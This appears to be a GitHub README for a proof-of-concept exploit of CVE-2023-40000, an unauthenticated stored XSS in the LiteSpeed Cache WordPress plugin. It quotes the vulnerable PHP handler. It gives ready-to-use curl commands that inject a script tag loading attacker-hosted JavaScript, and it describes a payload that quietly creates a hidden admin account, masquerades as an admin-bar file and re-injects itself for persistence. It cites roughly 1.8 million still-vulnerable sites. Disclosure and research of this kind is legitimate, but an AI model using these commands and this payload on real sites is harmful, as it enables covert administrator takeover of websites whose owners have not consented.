# LiteSpeed Cache XSS PoC

PoC for XSS vulnerability in the LiteSpeed Cache WordPress plugin allowing elevated privileges. This vulnerability was fixed in version **5.7.0.1** of the plugin, and was assigned [CVE-2023-40000](https://www.cve.org/CVERecord?id=CVE-2023-40000). According to [the plugin's advanced view page](https://wordpress.org/plugins/litespeed-cache/advanced/), about 35% of users are still using a vulnerable version (<5.7.0.1), which adds up to about 1.8M websites.

## Vulnerability Information

Due to lack of input sanitization in the `update_cdn_status` function, (unauthenticated) users are able to send a post request with an infected `_msg` form value that is stored and then displayed in the admin section of WordPress. This can allow anyone to create admin accounts, escalate their privileges, or steal sensitive information by just sending one unauthenticated POST request. The vulnerable function can be found [here](https://github.com/litespeedtech/lscache_wp/blob/v5.5/src/cdn-setup.cls.php#L49-L69) or below, and the `Admin_Display::error` function can be found [here](https://github.com/litespeedtech/lscache_wp/blob/2564cb05b6ba33fbf86fbcb62699dc5d3e28c9ae/src/admin-display.cls.php#L376-L385).

```php
/**
 * Callback for updating Auto CDN Setup status after run
 *
 * @since  4.7
 * @access public
 */
public function update_cdn_status() {

	if ( !isset( $_POST[ 'success' ] ) || !isset( $_POST[ 'result' ] ) ) {
		self::save_summary( array( 'cdn_setup_err' => __( 'Received invalid message from the cloud server. Please submit a ticket.', 'litespeed-cache' ) ) );
		return self::err( 'lack_of_param' );
	}
	if (!$_POST[ 'success' ]) {
		self::save_summary( array( 'cdn_setup_err' => $_POST[ 'result' ][ '_msg' ] ) );
		Admin_Display::error( __( 'There was an error during CDN setup: ', 'litespeed-cache' ) . $_POST[ 'result' ][ '_msg' ] );
	} else {
		$this->_process_cdn_status($_POST[ 'result' ]);
	}

	return self::ok();
}
```

## Proof of Concept

The proof of concept in this repository contains a NodeJS express server designed to obfuscate and deliver the XSS payload, while also capturing incoming pings and data. The payload script showcases the potential actions of attackers exploiting this vulnerability: it creates an admin account with the username "wp-config-user" and password "somepassword123". The XSS payload, which is also disguised as `admin-bar-reloaded.min`, hides the initial XSS popup on load, completely hides the created user in the `users.php` admin page, and repeats the initial POST request to maintain a persistent stored XSS.

### Installation and Usage

1. Install Node.js and npm if they are not already installed.
2. Clone the repository and navigate into the project directory.
3. Run `npm install` to install the dependencies.
4. Start the server with `node index.js`.

### Sending the POST Request

Use the following cURL command to send the POST request to the vulnerable endpoint:

#### Linux:

```bash
curl -X POST "https://target.website/wordpress/wp-json/litespeed/v1/cdn_status" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "success=0&result[_msg]=<script src=https://your.server/admin-bar-reloaded.min.js></script>"

```

#### Windows:

```cmd
curl -X POST "https://target.website/wordpress/wp-json/litespeed/v1/cdn_status" ^
-H "Content-Type: application/x-www-form-urlencoded" ^
-d "success=0&result[_msg]=<script src=https://your.server/admin-bar-reloaded.min.js></script>"
```

## Disclaimer

The contents of this repository are provided strictly for educational and research purposes. I am not responsible for any misuse or illegal activities stemming from the use of this proof of concept. On top of this, a warning has been issued on the LiteSpeed Cache plugin page advising all users to update their software due to this known vulnerability. Please ensure your installations are updated to version 5.7.0.1 or later to mitigate this issue.
